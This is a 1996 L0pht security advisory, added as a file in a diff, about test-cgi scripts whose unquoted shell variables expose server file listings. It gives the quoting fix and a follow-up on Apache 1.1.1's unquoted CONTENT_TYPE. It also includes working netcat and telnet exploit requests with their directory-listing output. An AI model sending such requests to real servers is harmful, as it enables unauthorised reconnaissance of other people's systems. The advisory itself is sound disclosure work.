@@ -1,0 +1,175 @@
+
+                  [ Advisory released April 1996 ]
+
+                            L0pht Report
+
+                       test-cgi vulnerability
+                         in certain setups
+
+Affected Program: test-cgi scripts found on various web servers.
+
+Severity: Anyone can remotely inventory the files on a machine.
+
+Author: mudge@l0pht.com
+
+Synopsis:
+
+On many web sites there exists a file called test-cgi (usually in
+the cgi-bin directory or somewhere similar). There is a problem
+with many of these test-cgi files. If your test-cgi file contains
+the following line (verbatim) then you are probably vulnerable.
+
+echo QUERY_STRING = $QUERY_STRING
+
+All of these lines should have the variables enclosed in loose
+quotes ("). Without these quotes certain special characters
+(specifically '*') get expanded where they shouldn't. Thus
+submitting a query of '*' will return the contents of the
+current directory (probably where all of the cgi files are...
+gee, there's jj and phf. Hmmm what are all those other cgi's
+that I haven't seen... wonder what holes exist in those?).
+Sending in a query of '/*' will list the root directory.
+And so on, and so on.
+
+This is the same as doing `echo *` when you've blown away 'ls'
+(not that this ever happens to anyone <grin>).
+
+The easiest way to list out the directories is via the query
+string. However, it is possible to do the same thing through
+many of the other variables (ie $REMOTE_HOST, $REMOTE_USER, etc.)
+in the right situations.
+
+
+Fix:
+
+The quick fix is to place loose quotes around all of the
+variables in the test-cgi file (they should have been there
+from the beginning!).
+
+echo QUERY_STRING = "$QUERY_STRING"
+
+This incorrect file has been seen in at least several versions
+of NCSA, and Apache.
+
+
+Example exploit:
+
+Below are examples (nc is netcat from avian.org, if you don't
+have it you should get it as it is an invaluable tool. You can
+always just telnet to port 80 and type in the GET... command.)
+
+------------------
+machine% echo "GET /cgi-bin/test-cgi?/*" | nc removed.name.com 80
+
+CGI/1.0 test script report:
+
+argc is 1. argv is /\*.
+
+SERVER_SOFTWARE = NCSA/1.4.1
+SERVER_NAME = removed.name.com
+GATEWAY_INTERFACE = CGI/1.1
+SERVER_PROTOCOL = HTTP/0.9
+SERVER_PORT = 80
+REQUEST_METHOD = GET
+HTTP_ACCEPT =
+PATH_INFO =
+PATH_TRANSLATED =
+SCRIPT_NAME = /bin/cgi-bin/test-cgi
+QUERY_STRING = /a /bin /boot /bsd /cdrom /dev /etc /home /lib /mnt
+/root /sbin /stand /sys /tmp /usr /usr2 /var
+REMOTE_HOST = remote.machine.com
+REMOTE_ADDR = 255.255.255.255
+REMOTE_USER =
+AUTH_TYPE =
+CONTENT_TYPE =
+CONTENT_LENGTH =
+
+------------------
+Or to see what other cgi-goodies are still floating around...
+------------------
+machine% echo "GET /cgi-bin/test-cgi?*" | nc removed.name.com 80
+
+CGI/1.0 test script report:
+
+argc is 1. argv is \*.
+
+SERVER_SOFTWARE = NCSA/1.4.1
+SERVER_NAME = removed.name.com
+GATEWAY_INTERFACE = CGI/1.1
+SERVER_PROTOCOL = HTTP/0.9
+SERVER_PORT = 80
+REQUEST_METHOD = GET
+HTTP_ACCEPT =
+PATH_INFO =
+PATH_TRANSLATED =
+SCRIPT_NAME = /bin/cgi-bin/test-cgi
+QUERY_STRING = calendar cgi-archie cgi-calendar cgi-date cgi-finger
+cgi-fortune cgi-lib.pl imagemap imagemap.cgi imagemap.conf index.html
+mail-query mail-query-2 majordomo majordomo.cf marker.cgi
+menu message.cgi munger.cgi munger.note ncsa-default.tar post-query
+query smartlist.cf src subscribe.cf test-cgi uptime
+REMOTE_HOST = remote.machine.com
+REMOTE_ADDR = 255.255.255.255
+REMOTE_USER =
+AUTH_TYPE =
+CONTENT_TYPE =
+CONTENT_LENGTH =
+
+
+
+
+
+
+
+================================================================================================
+
+
+
+	test-cgi
+
+
+
+|
+|Another data point for anyone out there running Apache ... test-cgi
+|in the apache-1.1.1 distribution already has the required
+|
+|echo QUERY_STRING = "$QUERY_STRING"
+|
+
+However, it does not have the necessary quotes around the "$CONTENT_TYPE"
+string.  Therefore it's still vulnerable in it's default configuration.
+Adding "set -f" as the second line of the script closes the hole completely.
+
+(www) frankenstein:~$ (echo POST /cgi-bin/test-cgi HTTP/1.0; echo Content-type: \* ; echo Content-length: 0; echo; sleep 5) | telnet localhost 80
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+HTTP/1.0 200 OK
+Date: Wed, 04 Dec 1996 04:11:15 GMT
+Server: Apache/1.1.1
+Content-type: text/plain
+
+CGI/1.0 test script report:
+
+argc is 0. argv is .
+
+SERVER_SOFTWARE = Apache/1.1.1
+SERVER_NAME = frankenstein.asylum.net
+GATEWAY_INTERFACE = CGI/1.1
+SERVER_PROTOCOL = HTTP/1.0
+SERVER_PORT = 80
+REQUEST_METHOD = POST
+HTTP_ACCEPT =
+PATH_INFO =
+PATH_TRANSLATED =
+SCRIPT_NAME = /cgi-bin/test-cgi
+QUERY_STRING =
+REMOTE_HOST = localhost
+REMOTE_ADDR = 127.0.0.1
+REMOTE_USER =
+AUTH_TYPE =
+CONTENT_TYPE = (bunch of files listed here, whose names I don't care to share)
+CONTENT_LENGTH = 0
+Connection closed by foreign host.
+(www) frankenstein:~$
+--
